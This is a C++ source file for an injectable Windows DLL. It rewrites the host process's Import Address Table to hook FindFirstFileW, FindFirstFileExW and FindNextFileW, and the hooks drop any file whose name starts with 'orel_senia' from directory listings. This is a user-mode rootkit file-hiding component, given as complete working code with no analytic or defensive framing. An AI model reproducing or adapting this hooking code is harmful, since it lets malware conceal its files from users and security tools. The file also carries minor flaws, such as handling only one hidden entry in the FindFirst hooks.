// dllmain.cpp : Defines the entry point for the DLL application.
#include "injected-2.h"

BOOL APIENTRY DllMain( HINSTANCE hInst,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		
		if (IAT_Patching(GetModuleHandle(NULL), "FindFirstFileW", FindFirstFileW_IAT, &originalFindFirstFileW) == 0)
		{
			OutputDebugStringA("Patching FindFirstFileW failed!");
		}
		else
		{
			OutputDebugStringA("Patching FindFirstFileW succeeded!");
		}
		if (IAT_Patching(GetModuleHandle(NULL), "FindFirstFileExW", FindFirstFileExW_IAT, &originalFindFirstFileExW) == 0)
		{
			OutputDebugStringA("Patching FindFirstFileExW_IAT failed!");
		}
		else
		{
			OutputDebugStringA("Patching FindFirstFileExW_IAT succeeded!");
		}
		if (IAT_Patching(GetModuleHandle(NULL), "FindNextFileW", FindNextFileW_IAT, &originalFindNextFileW) == 0)
		{
			OutputDebugStringA("Patching FindNextFileW failed!");
		}
		else
		{
			OutputDebugStringA("Patching FindNextFileW succeeded!");
		}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}




bool rewriteThunk(PIMAGE_THUNK_DATA pThunk, void* newFunc)
{

	DWORD CurrentProtect;
	DWORD junk;
	VirtualProtect(pThunk, 4096, PAGE_READWRITE, &CurrentProtect);
	pThunk->u1.Function = (DWORD)newFunc;
	VirtualProtect(pThunk, 4096, CurrentProtect, &junk);
	return true;
}

int IAT_Patching(HMODULE hModule,char * func_name_to_IAT,void * new_func_add,PDWORD func_orginial)
{
	
	if (hModule == NULL) return 0;
	IMAGE_DOS_HEADER* mz_head = (IMAGE_DOS_HEADER*)hModule;
	if (mz_head->e_magic != IMAGE_DOS_SIGNATURE) { OutputDebugStringA("Unable to find MS_DOS_HEADER"); exit(0); };
	IMAGE_NT_HEADERS32* nt_head = (IMAGE_NT_HEADERS*)((PBYTE)hModule + mz_head->e_lfanew);
	if (nt_head->Signature != IMAGE_NT_SIGNATURE) { OutputDebugStringA("Unable to find NT_HEADER"); exit(0); };
	DWORD importRVA = nt_head->OptionalHeader.DataDirectory[IMPORT_TABLE_INDEX].VirtualAddress;
	IMAGE_IMPORT_DESCRIPTOR *img_descr = (IMAGE_IMPORT_DESCRIPTOR*)((PBYTE)hModule + importRVA);
	int toBreakLoop = 0;
	while ((*(WORD*)img_descr) != 0)
	{
		PIMAGE_THUNK_DATA CurrOFThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + img_descr->OriginalFirstThunk);
		PIMAGE_THUNK_DATA CurrFThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + img_descr->FirstThunk);
		
		while (*(WORD*)CurrFThunk != 0 && *(WORD*)CurrOFThunk != 0)
		{
			PIMAGE_IMPORT_BY_NAME  iibn = (PIMAGE_IMPORT_BY_NAME)((PBYTE)hModule + CurrOFThunk->u1.AddressOfData);
			char * func_name = (char*)iibn->Name;
			if (strcmp(func_name_to_IAT, func_name) == 0)
			{
				toBreakLoop = 1;
				*func_orginial = (DWORD)(CurrFThunk->u1.Function);
				if (rewriteThunk(CurrFThunk, new_func_add) == true)
				{
					OutputDebugStringA(func_name);
					OutputDebugStringA("The override successfull!");
				}
				break;

			}
			else
			{
				CurrFThunk++;
				CurrOFThunk++;
			}
		}
		if (toBreakLoop == 0)
		{
			img_descr++;
		}
		else
		{
			return 1;
		}
	}
	return 0;
}



HANDLE WINAPI FindFirstFileW_IAT(__in LPCWSTR lpFileName, __out LPWIN32_FIND_DATAW lpFindFileData)
{
	ptrFindFirstFileW original = (ptrFindFirstFileW)originalFindFirstFileW;
	HANDLE ret = original(lpFileName, lpFindFileData);
	TCHAR msg[MAX_PATH];
	
	if (wcsstr(lpFindFileData->cFileName, L"orel_senia") == lpFindFileData->cFileName)
	{
		swprintf_s(msg, L"hiding Protected file : %s\n", lpFindFileData->cFileName);
		OutputDebugString(msg);
		FindNextFileW(ret, (LPWIN32_FIND_DATAW)lpFindFileData);
	}
	return ret;
}

HANDLE WINAPI FindFirstFileExW_IAT(__in LPCWSTR lpFileName, __in FINDEX_INFO_LEVELS fInfoLevelId, __out LPVOID lpFindFileData, __in FINDEX_SEARCH_OPS fSearchOp, __reserved  LPVOID lpSearchFilter, __in DWORD dwAdditionalFlags)
{
	ptrFindFirstFileExW original = (ptrFindFirstFileExW)originalFindFirstFileExW;
	HANDLE ret = original(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	TCHAR msg[MAX_PATH];
	if (wcsstr(((LPWIN32_FIND_DATAW)lpFindFileData)->cFileName, L"orel_senia") == ((LPWIN32_FIND_DATAW)lpFindFileData)->cFileName)
	{
		swprintf_s(msg, L"hiding Protected file : %s\n", ((LPWIN32_FIND_DATAW)lpFindFileData)->cFileName);
		OutputDebugString(msg);
		FindNextFileW(ret, (LPWIN32_FIND_DATAW)lpFindFileData);
	}
	return ret;
}

BOOL WINAPI FindNextFileW_IAT(__in HANDLE hFindFile, __out  LPWIN32_FIND_DATAW lpFindFileData)
{
	TCHAR msg[MAX_PATH];
	ptrFindNextFileW original_find_next = (ptrFindNextFileW)originalFindNextFileW;
	if (original_find_next(hFindFile, lpFindFileData))
	{
		if (wcsstr(lpFindFileData->cFileName, L"orel_senia") == lpFindFileData->cFileName)
		{
			swprintf_s(msg, L"hiding Protected file : %s\n", lpFindFileData->cFileName);
			OutputDebugString(msg);
			
			if (FindNextFileW_IAT(hFindFile, lpFindFileData))
				return 1;
			return 0;
		}
		return 1;
	}
	return 0;
}

